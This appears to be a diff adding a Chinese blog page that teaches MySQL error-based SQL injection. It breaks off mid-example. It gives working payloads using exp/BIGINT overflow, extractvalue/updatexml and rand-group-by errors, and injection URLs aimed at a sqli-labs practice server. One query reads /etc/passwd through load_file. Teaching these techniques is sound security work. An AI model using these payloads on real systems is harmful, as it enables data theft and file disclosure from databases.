@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="HatBoy" />
+
+
+
+<meta name="description" content="MySQL报错注入">
+<meta name="keywords" content="Web安全,SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL报错注入">
+<meta property="og:url" content="https://hatboy.github.io/2018/08/28/MySQL报错注入/index.html">
+<meta property="og:site_name" content="HatBoy的个人主页">
+<meta property="og:description" content="MySQL报错注入">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-08-28T01:54:45.473Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL报错注入">
+<meta name="twitter:description" content="MySQL报错注入">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="HatBoy的个人主页" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>MySQL报错注入 | HatBoy的个人主页</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?94c5bc16a94e5db3e2942494f0be64dd";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">HatBoy</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签&amp;分类</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:hatboy-dj@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/HatBoy/" title="GitHub"></a>
+                            
+                                <a class="fa 码云博客" href="http://hatboy.gitee.io/" title="码云博客"></a>
+                            
+                                <a class="fa CSDN" href="http://blog.csdn.net/dj1174232716" title="CSDN"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cython/">Cython</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python-tips/">Python tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python模块tips/">Python模块tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python语法/">Python语法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/asyncio/">asyncio</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socks/">socks</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全/">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/异步并发/">异步并发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/端口转发/">端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/调试/">调试</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://fmxfmx.gitee.io/">FMX</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://jewelz.me/">Jewelz</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.zhihu.com/people/talentisan/activities">轻狂书生</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://threetop.top/">ZCC</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://blog.csdn.net/u012017783">ZCC的CSDN</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://zcc888.gitee.io/">ZCC的博客</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一枚爱Python,爱海贼,爱健身,喜欢好玩有趣事物的程序员……</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">HatBoy</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">HatBoy</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签&amp;分类</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hatboy-dj@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/HatBoy/" title="GitHub"></a>
+                            
+                                <a class="fa 码云博客" target="_blank" href="http://hatboy.gitee.io/" title="码云博客"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="http://blog.csdn.net/dj1174232716" title="CSDN"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-MySQL报错注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/28/MySQL报错注入/" class="article-date">
+      <time datetime="2018-08-28T01:53:15.000Z" itemprop="datePublished">2018-08-28</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MySQL报错注入
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <excerpt in="" index="" |="" 首页摘要="">
+
+<p>MySQL报错注入</p>
+<a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+<ul>
+<li>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</li>
+<li>MYSQL报错注入大体可以分为以下几类：<ul>
+<li>BIGINT等数据类型溢出</li>
+<li>Xpath语法错误</li>
+<li>concat+rand()+group_by()导致主键重复</li>
+<li>数据库的一些特性</li>
+</ul>
+</li>
+<li>注意，在使用报错语句时，有两种使用方法，一种是AND连接，报错语句不需要写SELECT；另一种是UNION，报错语句需要些SELECT，同时还要注意列数量要对应，推荐使用AND连接。</li>
+</ul>
+<h2 id="BIGINT等数据类型溢出"><a href="#BIGINT等数据类型溢出" class="headerlink" title="BIGINT等数据类型溢出"></a>BIGINT等数据类型溢出</h2><ul>
+<li><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况，在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select 18446744073709551615<span class="string">+1</span>;</div><div class="line"><span class="keyword">ERROR </span>1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'</div><div class="line">mysql&gt; select ~0<span class="string">+1</span>;</div><div class="line"><span class="keyword">ERROR </span>1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'</div></pre></td></tr></table></figure>
+</li>
+<li><p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</div><div class="line">     &gt; root@localhost</div><div class="line">mysql&gt; <span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</div><div class="line">     &gt; 1</div><div class="line">mysql&gt; <span class="keyword">select</span> ~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</div><div class="line">     &gt; 18446744073709551615</div></pre></td></tr></table></figure>
+</li>
+<li><p>同理，利用exp函数也会产生类似的溢出错误：</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> user(</span>))x))</span>;</div><div class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): DOUBLE <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">'exp(~((select '</span>root@localhost<span class="string">' from dual)))'</span></div><div class="line">mysql&gt; <span class="keyword">select</span> (<span class="keyword">select</span>(!x-~<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="function"><span class="keyword">select</span> <span class="title">user</span>(<span class="params"></span>))x)a)</span>;</div><div class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): BIGINT UNSIGNED <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">'((not('</span>root@localhost<span class="string">')) - ~(0))'</span></div><div class="line">mysql&gt; <span class="keyword">select</span> (!(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="function"><span class="keyword">select</span> <span class="title">user</span>(<span class="params"></span>))x) - ~0)</span>;</div><div class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): BIGINT UNSIGNED <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">'((not((select '</span>root@localhost<span class="string">' from dual))) - ~(0))'</span></div><div class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span></span>)x))</span>;</div><div class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): DOUBLE <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">'exp(~((select '</span>CHARACTER_SETS<span class="string">' from dual)))'</span></div><div class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> concat(table_schema,<span class="string">':'</span>,table_name</span>) <span class="keyword">from</span> information_schema.tables limit 0,1)x))</span>;</div><div class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): DOUBLE <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> of range <span class="keyword">in</span> <span class="string">'exp(~((select '</span>information_schema:CHARACTER_SETS<span class="string">' from dual)))'</span></div><div class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">exp</span>(<span class="params">~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> load_file(<span class="string">'/etc/passwd'</span></span>))a))</span>;</div><div class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/bin:/bin/sync</div></pre></td></tr></table></figure>
+</li>
+<li><p>报错信息是有长度限制的，同时报错的信息跟MySQL版本、MySQL所在操作系统有关系。</p>
+</li>
+<li><p>几种形式的变种：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> !(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)-~<span class="number">0</span>;</div><div class="line">mysql&gt; <span class="keyword">select</span> (<span class="keyword">select</span>(!x-~<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)a);</div><div class="line">mysql&gt; <span class="keyword">select</span> (<span class="keyword">select</span>!x-~<span class="number">0.</span><span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)a);</div></pre></td></tr></table></figure>
+</li>
+<li><p>利用这种基于BIGINT溢出错误的注入手法，我们可以几乎可以使用MySQL中所有的数学函数，如：ATAN、CEIL、FLOOR、HEX、RAND、IN、CEILING、TRUNCATE、TAN、SQRT、ROUND‘SIGN等函数：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> !<span class="built_in">atan</span>((<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))-~<span class="number">0</span>; </div><div class="line">mysql&gt; <span class="keyword">select</span> !<span class="built_in">ceil</span>((<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))-~<span class="number">0</span>;</div><div class="line">mysql&gt; <span class="keyword">select</span> !<span class="built_in">floor</span>((<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))-~<span class="number">0</span>;</div></pre></td></tr></table></figure>
+</li>
+<li><p>注入案例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1' union <span class="keyword">select</span> (<span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">USER</span>())a))),<span class="number">2</span>,<span class="number">3</span><span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' union select (!(select * from (select user())x) - ~0),2,3-- </span></div><div class="line"><span class="string">http://192.168.100.8/sqli-labs/Less-5/?id=1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">concat</span>(table_schema,<span class="string">':'</span>,table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x)),<span class="number">2</span>,<span class="number">3</span><span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (exp(~(select * FROM(SELECT USER())a)))-- </span></div><div class="line"><span class="string">http://192.168.100.8/sqli-labs/Less-5/?id=1'</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">concat</span>(table_schema,<span class="string">':'</span>,table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x))<span class="comment">--</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="Xpath语法错误"><a href="#Xpath语法错误" class="headerlink" title="Xpath语法错误"></a>Xpath语法错误</h2><ul>
+<li><p>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容：</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,<span class="string">'/a/b'</span></span>)</span>;</div><div class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,<span class="string">'/a/b'</span>,<span class="number">1</span></span>)</span>;</div></pre></td></tr></table></figure>
+</li>
+<li><p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里:</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</div><div class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~5.5.36-log~'</div><div class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select user()),0x7e));</div><div class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~root@localhost~'</div><div class="line">mysql&gt; select updatexml(1,concat(0x7e,(select database()),0x7e),1);</div><div class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~security~'</div><div class="line">mysql&gt; select updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1),0x7e),1);</div><div class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~CHARACTER_SETS~'</div><div class="line">mysql&gt; select updatexml(1,concat(0x7e,(select concat(table_schema, ':',table_name) from information_schema.tables limit 0,1),0x7e),1);</div><div class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~information_schema:CHARACTER_SE'</div><div class="line">mysql&gt; select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1);</div><div class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '~emails,referers,uagents,users~'</div></pre></td></tr></table></figure>
+</li>
+<li><p>注入案例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and extractvalue(1,concat(0x7e,(select concat(table_schema, '</span>:<span class="string">', table_name) from information_schema.tables limit 0,1),0x7e))-- </span></div><div class="line"><span class="string">http://192.168.100.8/sqli-labs/Less-5/?id=1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="number">0x7e</span>))<span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' union select extractvalue(1,concat(0x7e,(select database()),0x7e)),2,3-- </span></div><div class="line"><span class="string">http://192.168.100.8/sqli-labs/Less-5/?id=1'</span> <span class="keyword">union</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(table_schema, <span class="string">':'</span>, table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) ,<span class="number">2</span>, <span class="number">3</span> <span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">'),0x7e)),2,3--</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>注意：extractvalue()和updatexml()报错信息是有长度限制的，最大长度限制32位。</p>
+</li>
+</ul>
+<h2 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h2><ul>
+<li><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错，错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*) from users group by floor(rand(0)*2);</div><div class="line"><span class="keyword">ERROR </span>1062 (23000): Duplicate entry '1' for key 'group_key'</div></pre></td></tr></table></figure>
+</li>
+<li><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p>
+</li>
+<li><p>MySQL官方：查询的时候如果使用rand()的话，该值会被计算多次，在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，最终会导致主键重复错误产生。</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> users <span class="built_in">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</div><div class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry '<span class="number">5.5</span><span class="number">.36</span>-log1' for <span class="built_in">key</span> 'group_key'</div><div class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">count</span>(*),concat(version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x;</div><div class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry '<span class="number">5.5</span><span class="number">.36</span>-log1' for <span class="built_in">key</span> 'group_key'</div><div class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> users <span class="built_in">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> limit <span class="number">0</span>,<span class="number">1</span>),':',<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</div><div class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry 'CHARACTER_SETS:<span class="number">1</span>' for <span class="built_in">key</span> 'group_key'</div><div class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">count</span>(*),concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x; </div><div class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry 'CHARACTER_SETS1' for <span class="built_in">key</span> 'group_key'</div><div class="line">mysql&gt; <span class="keyword">select</span> <span 